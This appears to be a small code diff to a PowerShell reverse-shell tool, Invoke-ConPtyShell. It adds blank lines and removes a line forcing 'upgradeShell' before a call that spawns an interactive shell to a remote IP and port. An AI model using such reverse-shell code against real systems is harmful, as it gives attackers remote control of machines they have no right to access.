@@ -116,6 +116,7 @@ function Invoke-ConPtyShell
 }
 
 $Source = @"
+
 using System;
 using System.IO;
 using System.Text;
@@ -1150,7 +1151,6 @@ public static class ConPtyShellMainClass{
             uint rows = ParseRows(args);
             uint cols = ParseCols(args);
             string commandLine = ParseCommandLine(args);
-            upgradeShell = true;
             output=ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
         }
         return output;
@@ -1164,4 +1164,5 @@ class MainClass{
         Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
     }
 }
+
 "@;
